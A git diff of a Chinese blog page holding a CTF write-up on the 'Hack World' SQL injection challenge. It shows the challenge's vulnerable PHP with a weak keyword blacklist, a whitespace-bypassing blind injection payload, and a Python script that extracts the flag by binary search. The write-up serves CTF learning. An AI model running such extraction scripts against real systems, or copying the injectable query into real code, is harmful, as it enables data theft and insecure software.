@@ -21,6 +21,8 @@
     <meta name="keywords" content="sql注入">
   
   
+    <meta name="description" content="空格绕过与bool盲注二分查找">
+  
 
   <!-- feed -->
   
@@ -374,9 +376,9 @@
               
   
   <div class='new-meta-item category'>
-    <a href='/categories/web/' rel="nofollow">
+    <a href='/categories/web%E5%88%B7%E9%A2%98/' rel="nofollow">
       <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <p>web</p>
+      <p>web刷题</p>
     </a>
   </div>
 
@@ -435,7 +437,8 @@
       <section class="article typo">
         <div class="article-entry" itemprop="articleBody">
           
-          <h2 id="学习博客"><a href="#学习博客" class="headerlink" title="学习博客"></a>学习博客</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11435298.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11435298.html</a></p>
+          <p>空格绕过与bool盲注二分查找</p>
+<a id="more"></a>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>空格绕过</li>
 <li>bool盲注二分查找</li>
@@ -456,6 +459,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser = <span class="string">'root'</span>;</span><br><span class="line">$dbpass = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>, <span class="string">'||'</span>, <span class="string">'#'</span>, <span class="string">'-'</span>, <span class="string">';'</span>, <span class="string">'&amp;'</span>, <span class="string">'+'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'`'</span>, <span class="string">'"'</span>, <span class="string">'insert'</span>, <span class="string">'group'</span>, <span class="string">'limit'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'*'</span>, <span class="string">'into'</span>, <span class="string">'union'</span>, <span class="string">'load_file'</span>, <span class="string">'outfile'</span>, <span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($blackList <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($sql, $blackitem)) &#123;<span class="comment">//在id中查找黑名单中的字符</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>, $dbuser, $dbpass);<span class="comment">//面向过程连接mysql</span></span><br><span class="line"><span class="keyword">if</span> (!$db) &#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>, $db);<span class="comment">//选择数据库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (safe($id)) &#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);<span class="comment">//进行查询</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($query) &#123;</span><br><span class="line">        $result = mysql_fetch_array($query);<span class="comment">//数组化显示查询结果，此处返回的数组应该是MYSQLI_ASSOC</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>使用的注入语句<code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code>第一次接触注入脚本，直接copy一下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://64ed7296-9aea-43ac-84ec-24e5c6f616a7.node1.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select      flag    from    flag),%d,1))&gt;%d,1,2)"</span> % (x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<h2 id="学习博客"><a href="#学习博客" class="headerlink" title="学习博客"></a>学习博客</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11435298.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11435298.html</a></p>
 
           
             <div class='article_footer'>
@@ -543,10 +547,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-11-30T22:00:03+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-19T14:27:51+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Nov 30, 2020</p>
+    <p>更新于：Jan 19, 2021</p>
   </a>
 </div>
 
@@ -573,7 +577,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
           
-          href="http://connect.qq.com/widget/shareqq/index.html?url=https://omppppppp.xyz/2020/11/30/hackworld/&title=Hack World[CISCN2019 华北赛区 Day2 Web1] - omp's blog&summary="
+          href="http://connect.qq.com/widget/shareqq/index.html?url=https://omppppppp.xyz/2020/11/30/hackworld/&title=Hack World[CISCN2019 华北赛区 Day2 Web1] - omp's blog&summary=空格绕过与bool盲注二分查找"
           
           >
           
@@ -585,7 +589,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
           
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://omppppppp.xyz/2020/11/30/hackworld/&title=Hack World[CISCN2019 华北赛区 Day2 Web1] - omp's blog&summary="
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://omppppppp.xyz/2020/11/30/hackworld/&title=Hack World[CISCN2019 华北赛区 Day2 Web1] - omp's blog&summary=空格绕过与bool盲注二分查找"
           
           >
           
@@ -597,7 +601,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
           
-          href="http://service.weibo.com/share/share.php?url=https://omppppppp.xyz/2020/11/30/hackworld/&title=Hack World[CISCN2019 华北赛区 Day2 Web1] - omp's blog&summary="
+          href="http://service.weibo.com/share/share.php?url=https://omppppppp.xyz/2020/11/30/hackworld/&title=Hack World[CISCN2019 华北赛区 Day2 Web1] - omp's blog&summary=空格绕过与bool盲注二分查找"
           
           >
           
@@ -623,20 +627,23 @@
             
               <a class='prev' href='/2020/11/30/backupfile/'>
                 <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>BackupFile[ACTF2020 新生赛]</p>
-                <p class='content'>知识点
+                <p class='content'>源码泄露与php弱类型
+
+知识点
 常见的源码泄露
 php弱类型
 
 做题思路备份文件index.php.bak
-1234567891011121314151617&lt;?phpinclude_once "flag.php...</p>
+1234567891011121314151617&lt;?phpinclude_o...</p>
               </a>
             
             
               <a class='next' href='/2020/11/30/easy-tornado/'>
                 <p class='title'>easy_tornado[护网杯 2018]<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-                <p class='content'>解题过程发现三个文件，点开后发现访问文件需要对应的文件名和md5值
-flag.txt中提示 flag in /fllllllllllllag  知道文件名为 /fllllllllllllag
-(...</p>
+                <p class='content'>tornado与ssti模版注入
+
+解题过程发现三个文件，点开后发现访问文件需要对应的文件名和md5值
+flag.txt中提示 flag in /fllllllllllllag  知道文件名为 ...</p>
               </a>
             
           </div>
@@ -707,7 +714,7 @@ flag.txt中提示 flag in /fllllllllllllag  知道文件名为 /fllllllllllllag
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#学习博客"><span class="toc-text">学习博客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#知识点"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学到的新知识"><span class="toc-text">学到的新知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#做题思路"><span class="toc-text">做题思路</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#知识点"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学到的新知识"><span class="toc-text">学到的新知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#做题思路"><span class="toc-text">做题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学习博客"><span class="toc-text">学习博客</span></a></li></ol>
     </div>
   </section>
 
